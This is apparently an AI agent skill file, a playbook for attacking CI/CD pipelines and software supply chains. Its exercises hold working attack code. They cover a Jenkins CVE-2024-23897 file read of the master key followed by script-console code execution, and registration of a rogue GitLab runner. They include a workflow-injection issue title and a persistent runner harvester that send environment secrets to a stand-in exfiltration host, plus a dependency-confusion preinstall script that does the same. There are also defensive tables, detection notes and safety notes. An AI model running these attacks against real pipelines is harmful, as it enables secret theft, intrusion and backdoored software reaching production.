---
name: ci-cd-supply-chain-attack
description: CI/CD pipeline and software supply chain compromise covering Jenkins (script console, Jenkinsfile injection, shared library abuse, CVE-2024-23897 args4j), GitLab CI/CD (runner abuse, .gitlab-ci.yml injection, self-hosted runner takeover, CVE-2022-1162, OmniAuth CVE-2024-9653), GitHub Actions (self-hosted runner abuse, pull_request_target trap, workflow injection via issue/PR title, secrets exfiltration via cache/artifact, GITHUB_TOKEN scope), CircleCI (context theft, OIDC abuse), Argo CD (CVE-2022-24348, default app creds), Flux CD (GitRepository CRD abuse), Tekton, Buildkite, Drone CI, software supply chain attacks (dependency confusion, typosquatting, brandjacking, malicious npm/PyPI packages, SBOM/SLSA, Sigstore/cosign, in-toto, S2C2F), notable incidents (SolarWinds SUNBURST, 3CX, Codecov, xz-utils CVE-2024-3094, event-stream, ua-parser-js), and detection/defense tooling (StepSecurity Harden-Runner, OpenSSF Scorecard, Socket, Sonatype Nexus, Snyk, Anchore Syft/Grype, KICS, Checkov, semgrep).
origin: github-trending-2026
version: "0.2.0.2"
compatibility: ">=0.1.38"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: appsec
  category: supply-chain-continuous-delivery
  tool_count: 22
  guide_count: 1
  mitre: "T1195-Supply Chain Compromise, T1195.001-Compromise Software Dependencies, T1195.002-Compromise Software Supply Chain, T1195.003-Hardware Compromise, T1199-Trusted Relationship, T1078-Valid Accounts"
  keywords:
    - ci-cd
    - supply-chain
    - jenkins
    - gitlab-ci
    - github-actions
    - argo-cd
    - flux-cd
    - dependency-confusion
    - typosquatting
    - sbom
    - slsa
    - sigstore
    - solarwinds
    - xz-utils
    - codecov
  last_reviewed: "2026-07-26"
---




# Skill: CI/CD & Supply Chain Attack — Pipeline Compromise, Build-System Exploitation & Dependency-Chain Implant

> **Supplementary Files**:
> - `payloads.md` — Per-platform attack catalogs (Jenkins script console + CVE-2024-23897 + Jenkinsfile injection + shared library abuse; GitLab CI runner takeover + .gitlab-ci.yml injection + CVE-2022-1162 + CVE-2024-9653; GitHub Actions `pull_request_target` trap + workflow injection via issue/PR title + self-hosted runner escape + cache/artifact exfiltration; CircleCI context theft + OIDC abuse; Argo CD CVE-2022-24348 + default app creds; Flux CD GitRepository CRD abuse; Tekton/Buildkite/Drone), dependency-confusion lab payloads, malicious npm/PyPI package templates, build-artifact tampering, detection-evasion (workflow-output obfuscation, log redaction, runner cleanup), SBOM/SLSA/Sigstore verification commands, OpenSSF Scorecard + StepSecurity Harden-Runner usage, Socket/Sonatype/Snyk triage commands — 80+ code blocks across 14 sections
> - `test-cases.md` — Structured test cases TC-CD-001 through TC-CD-012 covering Jenkins script console RCE, CVE-2024-23897 args4j exploit, Jenkinsfile injection, GitLab self-hosted runner takeover, GitHub Actions `pull_request_target` abuse, workflow injection via PR title, self-hosted runner persistence, dependency-confusion PoC lab, malicious npm implant, Argo CD CVE-2022-24348 secret leak, build provenance/SLSA verification, and OpenSSF Scorecard + Harden-Runner audit
> - `guides/ci-cd-supply-chain-attack-playbook.md` — End-to-end playbook walking from CI/CD recon (workflow YAML enumeration, runner discovery, secret-scope mapping) through initial access (workflow injection, runner takeover, dependency confusion), lateral movement (runner → cloud creds → prod), exfiltration (cache, artifact, OIDC token), persistence (rogue runner, malicious action, build-time backdoor), detection engineering (SIEM rules, anomalous egress, attestation verification), and lab-setup guidance — with deep dives on SolarWinds SUNBURST, Codecov, 3CX, and xz-utils

## Summary

CI/CD & Supply Chain Attack skill domain covering the build-and-deliver layer that ships code from developer laptops to production. This is where the modern breach lives: SolarWinds, Codecov, 3CX, xz-utils, CircleCI, tj-actions/changed-files all walked through the build system, not the application.

**Tools**: Jenkins CLI + script console, GitLab runner CLI, gh (GitHub Actions), circleci CLI, argocd CLI, flux CLI, kubectl, ko/syft (SBOM), cosign (Sigstore), in-toto, slsa-verifier, OpenSSF Scorecard, StepSecurity Harden-Runner, Socket CLI, Sonatype Nexus, Snyk CLI, Anchore Syft + Grype, KICS, Checkov, semgrep, trivy (+18)

**Domain**: appsec (category: supply-chain-continuous-delivery)

**MITRE ATT&CK**: T1195-Supply Chain Compromise, T1195.001-Compromise Software Dependencies, T1195.002-Compromise Software Supply Chain, T1199-Trusted Relationship, T1078-Valid Accounts

## Description

CI/CD and supply chain attack covers the full kill chain from build-system recon to production backdoor: enumerating CI/CD platforms and their workflows, discovering self-hosted runners and their IAM scope, abusing pipeline trigger semantics (the `pull_request_target` trap is the single highest-leverage bug in this domain), injecting code via attacker-controlled inputs that flow into workflow execution (issue titles, PR bodies, branch names, semver tags, commit SHAs), exploiting the build runner itself (Jenkins script console, GitLab runner takeover, GitHub Actions self-hosted runner escape), abusing the dependency resolution layer (dependency confusion, typosquatting, brandjacking, install-script malice), and finally tampering with build artifacts (signing key theft, registry push after builds, OIDC token theft to assume deploy roles).

This is **not** the same skill as `supply-chain-security`. That skill covers *defensive* scanning of dependencies in a project you own (Trivy, Dependabot, npm audit). This skill covers *offensive* compromise of the build system itself — the Jenkins master, the GitLab runner, the GitHub Actions workflow, the Argo CD control plane, the npm/PyPI registry entry. The defender owns the dependencies; the attacker owns the build. They are complementary: supply-chain-security tells you whether you're using a vulnerable `lodash`; ci-cd-supply-chain-attack tells you how an adversary would slip a backdoored `lodash` into your lockfile via a typosquatted install-time script.

**Difference from `secret-management-attack`**: secret-management-attack is broad — find credentials anywhere they leak. CI/CD supply chain attack is specific — the build system is both a target (it holds deploy secrets) and a vector (it produces artifacts that ship to production). The CI/CD secret-theft overlap is acknowledged; this skill goes further into the *build compromise* surface that secret-management-attack doesn't cover.

**Difference from `container-security`**: container-security covers runtime container protection (escape from a container to its host). CI/CD supply chain attack covers the *build-time* compromise of the image — adding a backdoor at the Dockerfile layer, abusing a multi-stage build to inject a sidecar, tampering with the registry push.

**Difference from `cloud-native-vuln-research`**: cloud-native-vuln-research covers CVE research on K8s/etcd/containerd. CI/CD supply chain attack covers the pipelines that *deploy* those components — compromising Argo CD, Flux CD, Tekton to push malicious manifests.

**Difference from `ad-cs-abuse`**: AD CS abuse is about PKI hierarchy in Active Directory. CI/CD supply chain attack treats signing keys (Sigstore/cosign, in-toto) as both a target (steal the signing key to sign a malicious artifact) and a defense (verify provenance to reject unsigned builds).

## Use Cases

- **CI/CD platform recon**: From a target's public GitHub/GitLab surface, enumerate all workflow files, identify self-hosted runners (label-based), map `secrets.*` usage, find `pull_request_target` workflows with checkout of attacker-controlled refs, locate `repository_dispatch` and `workflow_dispatch` entry points with attacker-controllable inputs.
- **Jenkins exploitation**: From an exposed Jenkins master, abuse the script console (`/script`) for RCE, exploit CVE-2024-23897 (args4j argument expansion → arbitrary file read), inject Groovy via Jenkinsfile `sh` steps, abuse shared libraries (`@Library('name')`) to land attacker code in every build.
- **GitLab CI/CD exploitation**: From a compromised project, abuse `.gitlab-ci.yml` injection (the YAML is attacker-controllable from feature branches), take over self-hosted runners via registration token leak (CVE-2022-1162), exploit OmniAuth providers (CVE-2024-9653), and pivot from a tagged runner into its cloud IAM role.
- **GitHub Actions exploitation**: Demonstrate the `pull_request_target` trap (forked PR code runs with the secret context), workflow injection via `${{ github.event.issue.title }}` flowing into `run:` blocks, self-hosted runner persistence (rogue process survives job cleanup), secrets exfiltration via cache (write to `actions/cache@v3` path, retrieve via second workflow), OIDC token theft to assume the deploy AWS role.
- **CircleCI exploitation**: Steal a context (org-wide env vars) via a compromised project, abuse OIDC federation to mint AWS/GCP tokens outside intended scope, exfiltrate via artifact upload.
- **Argo CD / Flux CD exploitation**: Exploit CVE-2022-24348 (Argo CD app proj/cluster resource leak), abuse default application credentials (the well-known `password: password` admin), compromise a GitRepository CRD to push malicious manifests, pivot from Argo to in-cluster service-account tokens.
- **Dependency confusion**: Stand up the attack against a target using a private registry with public-registry fallback — register the target's private package name on npm/PyPI with a higher semver, wait for the next CI build to pull the malicious version, achieve RCE on the build runner.
- **Typosquatting & brandjacking**: Identify typosquattable package names (`lodahs`, `requst`, `pyton-mysql`), identify brandjack opportunities (`company-internal-utils` published by an outsider), demonstrate install-time RCE via `preinstall` scripts.
- **Malicious package analysis**: Reverse a known-malicious package (Codecov bash uploader, event-stream, ua-parser-js, ctx, coa, rc) to understand the implant pattern, IOCs, and detection signatures.
- **Build provenance verification**: Verify a build artifact's SLSA provenance using `slsa-verifier`, verify a Sigstore signature using `cosign verify`, verify an in-toto attestation, reject unsigned artifacts via admission control (Sigstore policy-controller, Kyverno).
- **Detection engineering**: Author SIEM rules for runner abuse (egress to non-build-domains, secrets read outside build window, runner persistence), build-provenance verification failures, anomalous package-registry egress.

## Core Tools

### CI/CD Platform CLIs

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Jenkins CLI** | Job enumeration, script console, agent management | `java -jar jenkins-cli.jar -s http://jenkins/ groovysh` |
| **GitLab Runner CLI** | Runner registration, executor introspection | `gitlab-runner verify --token <runner_token>` |
| **gh (GitHub CLI)** | Workflow enum, run triggering, log download | `gh workflow list && gh run list --workflow=ci.yml` |
| **circleci CLI** | Context enum, pipeline trigger, OIDC inspect | `circleci context list` |
| **argocd CLI** | App enum, sync trigger, project/RBAC review | `argocd app list && argocd app get <app>` |
| **flux CLI** | Source enum, reconciliation trigger | `flux get sources all && flux reconcile kustomization <name>` |
| **tkn (Tekton)** | Pipeline run inspection, task enum | `tkn pipelineruns list` |
| **buildkite-agent** | Agent introspection, meta-data read | `buildkite-agent meta-data get <key>` |

### Container & Manifest

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **kubectl** | Manifest enum, secret dump, pod compromise | `kubectl get pods -A -o wide` |
| **helm** | Release enum, chart tampering | `helm list -A && helm get values <release>` |
| **kustomize** | Manifest build & inspection | `kustomize build . \| grep image:` |

### SBOM, Signing & Provenance

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **syft** | Generate SBOM from image/filesystem | `syft image:<ref> -o cyclonedx-json > sbom.json` |
| **grype** | Match SBOM against vuln DB | `grype sbom:sbom.json` |
| **cosign** | Sign + verify OCI artifacts (Sigstore) | `cosign verify --key cosign.pub <ref>` |
| **in-toto** | Attestation framework | `in-toto-verify --layout layout.json` |
| **slsa-verifier** | Verify SLSA L3 provenance | `slsa-verifier verify-artifact artifact.bin --provenance-path provenance.intoto.jsonl --source github.com/<org>/<repo>` |
| **ko** | Build + sign Go OCI images | `ko build --bare --tags latest ./cmd/app` |

### Detection & Defense (used to validate bypass)

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **OpenSSF Scorecard** | Score a repo's supply-chain posture | `scorecard --repo=https://github.com/<org>/<repo>` |
| **StepSecurity Harden-Runner** | Audit egress + sandbox a workflow | `uses: step-security/harden-runner@v2` |
| **Socket Security** | Package threat intel + install-time alerts | `socket security scan ./package.json` |
| **Sonatype Nexus / Nexus IQ** | Policy enforcement on artifact ingestion | `npm audit --json \| nexus-iq-cli` |
| **Snyk CLI** | Vuln + license + IaC scanning | `snyk test --all-projects --severity-threshold=high` |
| **KICS** | IaC vuln scanning (Terraform, K8s, ARM) | `kics scan -p ./terraform -o kics.json` |
| **Checkov** | IaC policy (Terraform, CloudFormation, K8s) | `checkov -d ./terraform --framework terraform` |
| **semgrep** | SAST + secret + IaC unified scanner | `semgrep ci --config p/ci --config p/github-actions` |
| **trivy** | Image + IaC + repo scanner | `trivy fs --scanners vuln,secret .` |

## Methodology

### CI/CD Supply Chain Attack Six-Phase Process

```
Phase 1            Phase 2            Phase 3            Phase 4            Phase 5            Phase 6
CI/CD Recon   →    Initial Access →   Pipeline           Lateral           Persistence    →   Detection &
& Inventory        via Workflow/      Compromise    →    Movement →             & Backdoor       Reporting
                   Runner/Dep            (Build)            (Cloud/Prod)                        & Attestation
   │                  │                  │                  │                  │                  │
   ▼                  ▼                  ▼                  ▼                  ▼                  ▼
Enumerate            pull_request_      Jenkinsfile     Runner IAM →       Rogue runner,     SIEM rules,
workflows, runners,  target, runner     injection,      AWS role, K8s      malicious         provenance
secret scope,        takeover, dep      shared          SA token, OIDC     action,           verification,
dependency           confusion, typo-   library abuse,  token → prod       build-time        SBOM/SLSA
attack surface       squat, CVE         artifact tamper  deployment         backdoor          attestation
```

**Phase 1: CI/CD Recon & Inventory**

Before any active exploitation, map the build surface. This phase produces a CI/CD inventory: platforms in use (Jenkins, GitLab CI, GitHub Actions, CircleCI, Argo CD, Flux CD, Tekton, Buildkite, Drone), runner fleet (hosted vs self-hosted, OS, IAM role, network position), workflow file inventory (every `.github/workflows/*.yml`, every `.gitlab-ci.yml`, every `Jenkinsfile`), secret scope per workflow (`secrets.*` references, masked CI variables, OIDC federation), entry points (`workflow_dispatch`, `repository_dispatch`, `pull_request_target`, issue/PR comment triggers), and dependency attack surface (private registry names, package manager, lockfile freshness).

```bash
# Inventory template
cat <<EOF > cicd_targets.tsv
kind            location                                    notes
platform        github.com/<org>/<repo>                     Actions
platform        gitlab.com/<org>/<repo>                     GitLab CI
platform        jenkins.<org>.infra                         Jenkins (web-exposed)
runner          arn:aws:iam::<acct>:role/<gha-role>         self-hosted, prod-deploy
runner          gitlab-runner-1.<org>.infra                 shell executor, prod kubeconfig
deploy          argocd.<org>.infra                          Argo CD, prod cluster
deploy          flux-system                                 Flux CD, prod cluster
registry        registry.<org>.infra                        private OCI registry
package         npm:@<org>/internal-utils                   private package
package         pypi:<org>-internal                         private package
artifact        oci:registry.<org>.infra/app:2024.11        prod artifact
EOF
```

**Phase 2: Initial Access**

Three primary paths:

1. **Workflow injection** — A `pull_request_target` workflow checks out the attacker's PR ref and runs `npm install` with secrets in env. A `workflow_dispatch` with `inputs` interpolated into `run:` blocks gives RCE on the runner. An issue/PR title flowing into `${{ github.event.issue.title }}` is shell injection.
2. **Runner takeover** — A self-hosted GitHub Actions runner with a stale registration token; a GitLab runner with a leaked registration token (CVE-2022-1162 class); a Jenkins agent with command-line args controllable (CVE-2024-23897 class). The runner is the asset: its IAM role, its kubeconfig, its secrets.
3. **Dependency confusion / typosquat** — Register a higher-version public package matching the target's private package name; next CI pull installs the malicious version. Or typosquat a popular package (`lodahs` for `lodash`) and wait for an install typo.

**Phase 3: Pipeline Compromise (the Build)**

Once on a runner, the build itself becomes the target. Modify a Jenkinsfile to add a step that exfiltrates the build artifact to an attacker-controlled registry. Add a `post-build` hook to a GitLab CI job that signs the artifact with stolen signing keys. Inject a `RUN` line into a Dockerfile that adds a backdoor user. The goal is that the artifact that ships to production is *not* the artifact the developer committed.

**Phase 4: Lateral Movement**

The runner's IAM role is the lateral pivot. GitHub Actions self-hosted runners frequently hold AWS deploy-role creds (long-lived or OIDC-minted). Jenkins agents frequently hold kubeconfig with cluster-admin. GitLab runners frequently hold vault tokens. Pivot-graph: runner cred → cloud secrets → prod DB → prod IAM → S3 reads → next role.

**Phase 5: Persistence & Backdoor**

The highest-ROI persistence is the *build-time backdoor*: a malicious change to the build process that survives source-code review because it never appears in the application source. Examples: a Jenkins shared library that injects a reverse shell into every build artifact; a GitHub Action that adds a step to every workflow; a dependency confusion payload that activates only in production builds. Detection is hard because the *source* looks clean.

**Phase 6: Detection, Reporting & Attestation**

Author SIEM rules for runner abuse (egress to non-build-domains in the build window, secrets read outside the build job, runner process persistence). Verify build provenance using SLSA L3 attestation. Recommend OpenSSF Scorecard + StepSecurity Harden-Runner as baseline controls. Report should map each finding to a real-world incident analog (SolarWinds, Codecov, 3CX, xz-utils).

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| Public GitHub repo, find vuln workflows | `scorecard --repo=...` + manual `pull_request_target` audit | `gh workflow list` + grep for `${{ github.event.* }}` |
| Exposed Jenkins master | CVE-2024-23897 args4j file read → script console RCE | Shared library abuse if creds available |
| GitLab self-hosted runner fleet | Read `.gitlab-ci.yml`, hunt runner registration tokens | CVE-2022-1162 if older runner |
| Suspected dep-confusion exposure | Compare private registry names against public npm/PyPI | Run `npm view <name>` for each private name |
| Argo CD exposed | CVE-2022-24348 app proj leak → cluster compromise | Default admin creds (admin/password) on older versions |
| Build provenance verification | `slsa-verifier` on artifact + attestation | `cosign verify-attestation --type slsaprovenance` |
| Malicious package reverse | `unpkg`/`pip download` + grep for `preinstall`/setup hooks | `socket security scan <pkg>` for IOC check |
| SIEM rule authoring | Map runner abuse TTPs (egress, persistence, secret timing) | Reference 3CX / Codecov / SUNBURST telemetry |
| Harden-Runner baseline | `step-security/harden-runner@v2` on every workflow | GitHub Advanced Security + Dependabot + CodeQL |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **`pull_request_target` discipline** | Never check out `${{ github.event.pull_request.head.sha }}` inside a `pull_request_target` workflow with secrets in env. If cross-fork CI is needed, use a separate workflow that does not access secrets. |
| **StepSecurity Harden-Runner** | Drop-in action that restricts runner egress to allowlisted domains, monitors filesystem changes, and alerts on anomalous process exec. Should be the first step of every workflow. |
| **OpenSSF Scorecard ≥ 7** | Run on every repo; require remediation of any score < 7. Checks branch protection, signed commits, code review, SAST, dependency update, token permissions, etc. |
| **Token permissions lockdown** | Every workflow should set `permissions: contents: read` at minimum. Never use `permissions: write-all` in a workflow that runs on PR triggers. |
| **Self-hosted runner isolation** | Self-hosted runners should be ephemeral (auto-terminate after each job), single-tenant per repo, and run in a hardened network segment. Never use self-hosted runners on a fork-PR-triggered workflow. |
| **OIDC federation over long-lived secrets** | Replace long-lived AWS/GCP/Azure deploy keys with OIDC federation (GitHub Actions OIDC, GitLab CI OIDC). The OIDC token is short-lived and scoped per-workflow. |
| **Sigstore/cosign signing + admission control** | Every artifact signed at build time; cluster admission control (Sigstore policy-controller, Kyverno) rejects unsigned artifacts. |
| **SLSA L3 provenance** | Build system generates in-toto provenance attestation; deployment verifies provenance before rollout. Stops the "build-time backdoor" class. |
| **SBOM generation + monitoring** | Every build produces a CycloneDX/SPDX SBOM; continuous monitoring against NVD/OSV-DB for new vulns in dependencies. |
| **Dependency confusion defense** | Configure package managers to fail-closed on private-name lookups (npm `--registry` scope mapping, pip `--index-url` separation, Artifactory/Nexus with virtual repos that pin private names). |
| **Socket / Sonatype on every install** | Socket.dev or Sonatype Nexus IQ intercepts every `npm install` / `pip install` and blocks known-malicious packages. |
| **Pre-commit hooks (gitleaks + typoscan)** | Block typosquatted package imports and leaked CI tokens before they reach git history. |
| **SIEM rules for runner abuse** | Alert on (a) runner egress to non-build-domains, (b) secrets read outside the build job window, (c) runner process persistence, (d) new outbound OIDC token mint. |
| **Build-logging redaction** | Mask `::add-mask::` (GitHub Actions), GitLab CI `mask`, Jenkins Credentials Binding — every secret that touches the log should be auto-masked. |
| **Separation of duties on production deploys** | The build system should not have direct prod-deploy rights; require a separate approval gate (GitHub Environment protection rules, Argo CD sync windows). |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: CI/CD Recon — Workflow Enumeration & Secret-Scope Mapping

Goal: from a public GitHub repo, map every workflow, identify `pull_request_target` trap, and locate workflow-injection sinks.

```bash
# Clone the target
git clone https://github.com/<org>/<repo>.git target && cd target

# Enumerate workflows
ls -la .github/workflows/

# Score the repo's supply-chain posture
scorecard --repo=https://github.com/<org>/<repo> --format=json -o scorecard.json

# Find pull_request_target workflows (HIGH RISK)
grep -rE "pull_request_target" .github/workflows/

# Find workflow injection sinks (interpolation of github.event.* into run:)
grep -rnE '\$\{\{.*github\.event\.(issue|pull_request|comment|head_ref|ref)' .github/workflows/

# Find secrets in PR-triggered workflows (the smoking gun)
for f in .github/workflows/*.yml; do
  if grep -q "pull_request_target\|pull_request:" "$f"; then
    echo "=== $f ==="
    grep -E "secrets\.|env:" "$f"
  fi
done

# Find self-hosted runners
grep -rE "runs-on:.*self-hosted" .github/workflows/

# Map token permissions
grep -rA5 "^permissions:" .github/workflows/ | head -100
```

### Exercise 2: Jenkins Script Console RCE & CVE-2024-23897

Goal: from an exposed Jenkins master, read arbitrary files via CVE-2024-23897 and pivot to script-console RCE.

```bash
# CVE-2024-23897 — args4j argument expansion allows arbitrary file read
# Any command that accepts an @-prefixed path will read that file
java -jar jenkins-cli.jar -s http://jenkins.<org>.infra/ \
  -http help --../../../etc/passwd @/etc/passwd

# Read Jenkins secrets directory (master key, hudson.util.Secret)
java -jar jenkins-cli.jar -s http://jenkins.<org>.infra/ \
  -http help --../../../var/lib/jenkins/secrets/master.key @/var/lib/jenkins/secrets/master.key

# From file read → script console access: read the crumb and admin token,
# then POST to /script-text
JENKINS_CRUMB=$(curl -s -c cookies.txt http://jenkins.<org>.infra/crumbIssuer/api/json \
  | jq -r '.crumb')
curl -b cookies.txt -H "Jenkins-Crumb:$JENKINS_CRUMB" \
  -d 'script=println "id".execute().text' \
  http://jenkins.<org>.infra/scriptText/
```

See `payloads.md §2` for the full CVE-2024-23897 exploit chain and script-console Groovy payloads.

### Exercise 3: GitLab CI Self-Hosted Runner Takeover

Goal: from a leaked runner registration token, register a rogue runner that captures every job in the fleet.

```bash
# Step 1: Discover the registration token (CVE-2022-1162 class — old runners leak it)
# Tokens appear in: .gitlab-ci.yml, runner configs, CI logs, screenshots
grep -rE "REGISTRATION_TOKEN|gitlab-runner register" /target/

# Step 2: Register a rogue runner (PLACEHOLDER URL)
gitlab-runner register \
  --url https://gitlab.<org>.infra \
  --registration-token REPLACE_WITH_YOUR_REGISTRATION_TOKEN \
  --executor shell \
  --description "ci-cd-supply-chain-attack-rogue" \
  --tag-list linux,prod \
  --run-untagged

# Step 3: The rogue runner now captures jobs tagged linux,prod — including
# those carrying $PROD_DEPLOY_TOKEN, $KUBECONFIG, $VAULT_TOKEN.
# See payloads.md §3.3 for the exfil payload.
```

### Exercise 4: GitHub Actions `pull_request_target` Trap

Goal: demonstrate how a forked PR can exfiltrate repository secrets via `pull_request_target`.

```yaml
# .github/workflows/integration.yml (VULNERABLE)
name: integration
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker PR ref
      - run: npm ci                                       # runs attacker package.json
      - run: npm test
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}       # exposed to attacker code
```

Attack: fork the repo, modify `package.json` `preinstall` to exfiltrate `process.env`, open a PR. See `payloads.md §4.2` for the full payload.

### Exercise 5: Workflow Injection via Issue/PR Title

Goal: demonstrate how `${{ github.event.* }}` interpolation into `run:` blocks is shell injection.

```yaml
# .github/workflows/triage.yml (VULNERABLE)
name: triage
on:
  issues:
    types: [opened]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.issue.title }}" | xargs gh issue edit ${{ github.event.issue.number }} --add-label
```

Attack: open an issue titled `"; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env | base64); echo "` — the title interpolates into the `run:` block as shell. See `payloads.md §4.4`.

### Exercise 6: Self-Hosted Runner Persistence

Goal: plant a rogue process on a self-hosted runner that survives job cleanup and harvests secrets from subsequent jobs.

```bash
# Inside a job step (job runs as 'runner' user)
mkdir -p ~/.local/ci-cd-supply-chain-attack
cat > ~/.local/ci-cd-supply-chain-attack/harvest.sh <<'EOF'
#!/bin/bash
# Listen for env-file writes by subsequent jobs; exfil on change
while true; do
  for envfile in /tmp/actions_env_* /home/runner/work/_temp/*; do
    [ -f "$envfile" ] || continue
    new_hash=$(sha256sum "$envfile" | cut -d' ' -f1)
    old_hash=$(cat ~/.local/ci-cd-supply-chain-attack/.hashes 2>/dev/null | grep "$envfile" | cut -d' ' -f2)
    [ "$new_hash" = "$old_hash" ] && continue
    curl -s -X POST -d @"$envfile" http://REPLACE_WITH_YOUR_EXFIL_HOST/env
    echo "$envfile $new_hash" >> ~/.local/ci-cd-supply-chain-attack/.hashes
  done
  sleep 5
done
EOF
chmod +x ~/.local/ci-cd-supply-chain-attack/harvest.sh
nohup ~/.local/ci-cd-supply-chain-attack/harvest.sh >/dev/null 2>&1 &
disown
```

### Exercise 7: Dependency Confusion PoC Lab

Goal: stand up a private registry with public fallback, register a malicious public package, demonstrate that the next `npm install` pulls the malicious version.

```bash
# Lab setup — see payloads.md §6.1 for the full Verdaccio config
# 1. Private registry: Verdaccio on localhost:4873 with @<scope>/internal-utils
# 2. Public registry: npmjs.org — register @<scope>/internal-utils@99.99.99
#    (use a sandbox scope like REPLACE_WITH_YOUR_SCOPE)

# Target .npmrc (vulnerable — has fallback to public)
cat > target/.npmrc <<EOF
@<scope>:registry=http://localhost:4873
registry=https://registry.npmjs.org
EOF

# Attacker's malicious public package (use SANDBOX scope)
mkdir -p dc-payload && cd dc-payload
cat > package.json <<EOF
{
  "name": "@REPLACE_WITH_YOUR_SCOPE/internal-utils",
  "version": "99.99.99",
  "preinstall": "node -e \"process.stdout.write(Buffer.from(process.env).toString('base64'))\" | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env"
}
EOF
npm publish --access public

# Trigger the target's next CI build (uses npm ci / npm install)
# Result: public version 99.99.99 > private version 1.0.0 → malicious preinstall runs
```

### Exercise 8: Malicious npm Package Analysis

Goal: reverse a known-malicious package (e.g., the `event-stream` 3.3.6 successor, `flatmap-stream` cryptominer) to extract IOCs.

```bash
# Pull a suspicious package version
npm pack ua-parser-js@0.7.29  # known-malicious version range (2021 incident)

# Inspect install scripts (the primary attack vector)
tar -tzf ua-parser-js-0.7.29.tgz | head
tar -xzf ua-parser-js-0.7.29.tgz && cd package

# Look for preinstall, postinstall, install hooks
jq '.scripts' package.json

# Run semgrep with malicious-package rules
semgrep --config p/malicious-packages .

# Submit to Socket for IOC enrichment
socket security scan .
```

### Exercise 9: Argo CD CVE-2022-24348 Secret Leak

Goal: from a low-privilege Argo CD app, leak secrets from other apps/projects.

```bash
# CVE-2022-24348 — Argo CD < 2.1.15 / < 2.0.18 allows reading other apps'
# Helm values containing secrets by abusing the repo-server sync API.
# See payloads.md §5.2 for the full request.

# Step 1: Identify Argo CD version
curl -sk https://argocd.<org>.infra/api/version | jq .

# Step 2: From a low-priv token, request a sync on a values file that
# references another project's chart (passes through repo-server
# without project-scoped authorization).
argocd app sync REPLACE_WITH_YOUR_APP \
  --values /../../other-project/secret-values.yaml
```

### Exercise 10: Build Provenance & SLSA L3 Verification

Goal: verify that a production artifact came from a trusted source via SLSA L3 provenance + Sigstore.

```bash
# Generate SBOM at build time
syft image:registry.<org>.infra/app:2024.11 -o cyclonedx-json > sbom.json

# Sign the artifact with Sigstore (keyless, OIDC-backed)
cosign sign --yes registry.<org>.infra/app:2024.11

# Generate SLSA L3 provenance (using slsa-github-generator action)
# See payloads.md §13.2 for the action workflow.

# Verify provenance at deploy time
slsa-verifier verify-artifact \
  --provenance-path provenance.intoto.jsonl \
  --source github.com/<org>/<repo> \
  app.bin

# Verify signature
cosign verify \
  --certificate-identity-regexp "https://github.com/<org>/<repo>/.github/workflows/.+" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  registry.<org>.infra/app:2024.11
```

## Safety Notes

- **Authorization is non-negotiable**: scanning or attempting to exploit a CI/CD system you do not own, registering typosquatted packages against a real registry, or attempting dependency-confusion against a target you have not been contracted to test are crimes in most jurisdictions (CFAA, CMA, equivalents). The Sony, Uber, and Coinbase prosecutions all included CI/CD-system access charges.
- **`pull_request_target` exploitation is detectable**: GitHub's security team monitors for forked PRs that attempt to access secrets in `pull_request_target` workflows; secret reads are logged. Use only in authorized engagements and expect follow-up from GitHub Abuse.
- **CVE exploitation against production is a felony without authorization**: CVE-2024-23897 (Jenkins args4j), CVE-2022-24348 (Argo CD), CVE-2022-1162 (GitLab runner) all have published PoCs; running them against an unauthorized target is a crime.
- **Dependency confusion against third parties is unauthorized access**: the 2021 Alex Birsan research that breached Apple/Microsoft/PayPal was coordinated with those companies in advance. Repeating the technique against a target you have not contracted with is the same felony.
- **Self-hosted runner persistence is the highest-severity finding in this skill**: it persists across jobs, captures every secret in every subsequent build, and is the closest analog to the Codecov and SUNBURST compromise patterns. Treat as CRITICAL and notify immediately.
- **OIDC token theft is a lateral-movement fast lane**: a single stolen OIDC token from a GitHub Actions runner can mint AWS/GCP/Azure tokens for any role the workflow is allowed to assume. Treat OIDC minting events as anomalous by default.
- **Malicious package reverse engineering**: take a snapshot of the sandbox (vm, container) before unpacking — many malicious packages have anti-analysis (VM detection, debugger traps). Run in an isolated VM with no network egress except a logged proxy.
- **No real secrets in examples**: every token, key, URL, package name, and registry path in this skill is a placeholder (`REPLACE_WITH_YOUR_*`). Do not weaponize the payloads against real targets.

## Detection Methods

### CI/CD Pipeline Indicators
- **Pipeline config changes**: Unauthorized `.github/workflows/*.yml` modifications; new `Jenkinsfile` rules.
- **Secret access anomalies**: CI runner accessing secrets not used by typical pipeline.
- **Out-of-band network calls**: CI runner making external API calls during build (data exfil).
- **Build artifact modifications**: Hash of build output differs from source-controlled manifest.
- **Self-hosted runner abuse**: Self-hosted GitHub Actions runner in dormant state; sudden activity.

### Dependency Supply Chain Indicators
- **New package versions**: Recently published package versions (<24h) suddenly widely used.
- **Typosquatting**: Package name differs from legitimate by 1-2 characters.
- **Maintainer changes**: Package maintainer changed recently; new email domain.
- **Install script anomalies**: `postinstall` scripts executing network calls or system commands.
- **Dependency confusion**: Private package name registered publicly; bypass internal registry.

### SIEM Detection Rules
- **Splunk SPL**: `index=ci github.event="workflow_run" | stats count by head_branch | where head_branch NOT IN ("main", "develop")`
- **GitHub Advanced Security**: Dependency review action; secret scanning; CodeQL analysis.
- **Snyk / Dependabot**: Vulnerability scanning of dependencies; alert on new CVEs.
- **Sigstore / Cosign**: Verify container/image signatures; alert on unsigned images.

## Defense Evasion Techniques

### CI/CD Compromise Stealth
